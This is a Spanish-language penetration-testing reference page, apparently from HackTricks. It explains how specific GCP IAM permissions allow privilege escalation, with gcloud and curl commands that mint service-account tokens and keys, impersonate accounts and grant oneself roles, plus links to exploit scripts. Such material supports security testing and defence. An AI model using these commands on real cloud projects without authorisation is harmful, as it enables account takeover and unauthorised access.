# GCP - IAM Privesc

{{#include ../../../banners/hacktricks-training.md}}

## IAM

Encuentra más información sobre IAM en:

{{#ref}}
../gcp-services/gcp-iam-and-org-policies-enum.md
{{#endref}}

### `iam.roles.update` (`iam.roles.get`)

Un atacante con los permisos mencionados podrá actualizar un rol asignado a ti y darte permisos adicionales a otros recursos como:
```bash
gcloud iam roles update <rol name> --project <project> --add-permissions <permission>
```
Puedes encontrar un script para automatizar la **creación, explotación y limpieza de un entorno vulnerable aquí** y un script de python para abusar de este privilegio [**aquí**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.roles.update.py). Para más información, consulta la [**investigación original**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).

### `iam.serviceAccounts.getAccessToken` (`iam.serviceAccounts.get`)

Un atacante con los permisos mencionados podrá **solicitar un token de acceso que pertenece a una Cuenta de Servicio**, por lo que es posible solicitar un token de acceso de una Cuenta de Servicio con más privilegios que los nuestros.
```bash
gcloud --impersonate-service-account="${victim}@${PROJECT_ID}.iam.gserviceaccount.com" \
auth print-access-token
```
Puedes encontrar un script para automatizar la [**creación, explotación y limpieza de un entorno vulnerable aquí**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/4-iam.serviceAccounts.getAccessToken.sh) y un script de python para abusar de este privilegio [**aquí**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.getAccessToken.py). Para más información, consulta la [**investigación original**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).

### `iam.serviceAccountKeys.create`

Un atacante con los permisos mencionados podrá **crear una clave gestionada por el usuario para una Cuenta de Servicio**, lo que nos permitirá acceder a GCP como esa Cuenta de Servicio.
```bash
gcloud iam service-accounts keys create --iam-account <name> /tmp/key.json

gcloud auth activate-service-account --key-file=sa_cred.json
```
Puedes encontrar un script para automatizar la [**creación, explotación y limpieza de un entorno vulnerable aquí**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/3-iam.serviceAccountKeys.create.sh) y un script de python para abusar de este privilegio [**aquí**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccountKeys.create.py). Para más información, consulta la [**investigación original**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).

Ten en cuenta que **`iam.serviceAccountKeys.update` no funcionará para modificar la clave** de un SA porque para hacer eso también se necesita el permiso `iam.serviceAccountKeys.create`.

### `iam.serviceAccounts.implicitDelegation`

Si tienes el **`iam.serviceAccounts.implicitDelegation`** permiso en una Cuenta de Servicio que tiene el **`iam.serviceAccounts.getAccessToken`** permiso en una tercera Cuenta de Servicio, entonces puedes usar implicitDelegation para **crear un token para esa tercera Cuenta de Servicio**. Aquí hay un diagrama para ayudar a explicar.

![](https://rhinosecuritylabs.com/wp-content/uploads/2020/04/image2-500x493.png)

Ten en cuenta que según la [**documentación**](https://cloud.google.com/iam/docs/understanding-service-accounts), la delegación de `gcloud` solo funciona para generar un token utilizando el [**generateAccessToken()**](https://cloud.google.com/iam/credentials/reference/rest/v1/projects.serviceAccounts/generateAccessToken) método. Así que aquí tienes cómo obtener un token utilizando la API directamente:
```bash
curl -X POST \
'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/'"${TARGET_SERVICE_ACCOUNT}"':generateAccessToken' \
-H 'Content-Type: application/json' \
-H 'Authorization: Bearer '"$(gcloud auth print-access-token)" \
-d '{
"delegates": ["projects/-/serviceAccounts/'"${DELEGATED_SERVICE_ACCOUNT}"'"],
"scope": ["https://www.googleapis.com/auth/cloud-platform"]
}'
```
Puedes encontrar un script para automatizar la [**creación, explotación y limpieza de un entorno vulnerable aquí**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/5-iam.serviceAccounts.implicitDelegation.sh) y un script de python para abusar de este privilegio [**aquí**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.implicitDelegation.py). Para más información, consulta la [**investigación original**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).

### `iam.serviceAccounts.signBlob`

Un atacante con los permisos mencionados podrá **firmar cargas útiles arbitrarias en GCP**. Por lo tanto, será posible **crear un JWT no firmado del SA y luego enviarlo como un blob para obtener el JWT firmado** por el SA que estamos atacando. Para más información [**lee esto**](https://medium.com/google-cloud/using-serviceaccountactor-iam-role-for-account-impersonation-on-google-cloud-platform-a9e7118480ed).

Puedes encontrar un script para automatizar la [**creación, explotación y limpieza de un entorno vulnerable aquí**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/6-iam.serviceAccounts.signBlob.sh) y un script de python para abusar de este privilegio [**aquí**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signBlob-accessToken.py) y [**aquí**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signBlob-gcsSignedUrl.py). Para más información, consulta la [**investigación original**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).

### `iam.serviceAccounts.signJwt`

Un atacante con los permisos mencionados podrá **firmar tokens web JSON (JWTs) bien formados**. La diferencia con el método anterior es que **en lugar de hacer que Google firme un blob que contiene un JWT, usamos el método signJWT que ya espera un JWT**. Esto lo hace más fácil de usar, pero solo puedes firmar JWT en lugar de cualquier byte.

Puedes encontrar un script para automatizar la [**creación, explotación y limpieza de un entorno vulnerable aquí**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/7-iam.serviceAccounts.signJWT.sh) y un script de python para abusar de este privilegio [**aquí**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signJWT.py). Para más información, consulta la [**investigación original**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).

### `iam.serviceAccounts.setIamPolicy` <a href="#iam.serviceaccounts.setiampolicy" id="iam.serviceaccounts.setiampolicy"></a>

Un atacante con los permisos mencionados podrá **agregar políticas IAM a las cuentas de servicio**. Puedes abusar de esto para **otorgarte a ti mismo** los permisos que necesitas para suplantar la cuenta de servicio. En el siguiente ejemplo, nos estamos otorgando el rol `roles/iam.serviceAccountTokenCreator` sobre el SA interesante:
```bash
gcloud iam service-accounts add-iam-policy-binding "${VICTIM_SA}@${PROJECT_ID}.iam.gserviceaccount.com" \
--member="user:username@domain.com" \
--role="roles/iam.serviceAccountTokenCreator"

# If you still have prblem grant yourself also this permission
gcloud iam service-accounts add-iam-policy-binding "${VICTIM_SA}@${PROJECT_ID}.iam.gserviceaccount.com" \ \
--member="user:username@domain.com" \
--role="roles/iam.serviceAccountUser"
```
Puedes encontrar un script para automatizar la [**creación, explotación y limpieza de un entorno vulnerable aquí**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/d-iam.serviceAccounts.setIamPolicy.sh)**.**

### `iam.serviceAccounts.actAs`

El **permiso iam.serviceAccounts.actAs** es como el **permiso iam:PassRole de AWS**. Es esencial para ejecutar tareas, como iniciar una instancia de Compute Engine, ya que otorga la capacidad de "actuar como" una Cuenta de Servicio, asegurando una gestión segura de permisos. Sin esto, los usuarios podrían obtener acceso indebido. Además, explotar el **iam.serviceAccounts.actAs** implica varios métodos, cada uno requiriendo un conjunto de permisos, a diferencia de otros métodos que solo necesitan uno.

#### Suplantación de cuenta de servicio <a href="#service-account-impersonation" id="service-account-impersonation"></a>

Suplantar una cuenta de servicio puede ser muy útil para **obtener nuevos y mejores privilegios**. Hay tres formas en las que puedes [suplantar otra cuenta de servicio](https://cloud.google.com/iam/docs/understanding-service-accounts#impersonating_a_service_account):

- Autenticación **usando claves privadas RSA** (cubierto arriba)
- Autorización **usando políticas de Cloud IAM** (cubierto aquí)
- **Desplegando trabajos en servicios de GCP** (más aplicable a la compromisión de una cuenta de usuario)

### `iam.serviceAccounts.getOpenIdToken`

Un atacante con los permisos mencionados podrá generar un OpenID JWT. Estos se utilizan para afirmar la identidad y no necesariamente llevan ninguna autorización implícita contra un recurso.

Según este [**interesante post**](https://medium.com/google-cloud/authenticating-using-google-openid-connect-tokens-e7675051213b), es necesario indicar la audiencia (servicio donde deseas usar el token para autenticarte) y recibirás un JWT firmado por google indicando la cuenta de servicio y la audiencia del JWT.

Puedes generar un OpenIDToken (si tienes acceso) con:
```bash
# First activate the SA with iam.serviceAccounts.getOpenIdToken over the other SA
gcloud auth activate-service-account --key-file=/path/to/svc_account.json
# Then, generate token
gcloud auth print-identity-token "${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com" --audiences=https://example.com
```
Entonces puedes usarlo para acceder al servicio con:
```bash
curl -v -H "Authorization: Bearer id_token" https://some-cloud-run-uc.a.run.app
```
Algunos servicios que admiten autenticación a través de este tipo de tokens son:

- [Google Cloud Run](https://cloud.google.com/run/)
- [Google Cloud Functions](https://cloud.google.com/functions/docs/)
- [Google Identity Aware Proxy](https://cloud.google.com/iap/docs/authentication-howto)
- [Google Cloud Endpoints](https://cloud.google.com/endpoints/docs/openapi/authenticating-users-google-id) (si se utiliza Google OIDC)

Puedes encontrar un ejemplo de cómo crear un token OpenID en nombre de una cuenta de servicio [**aquí**](https://github.com/carlospolop-forks/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.getOpenIdToken.py).

## Referencias

- [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{{#include ../../../banners/hacktricks-training.md}}
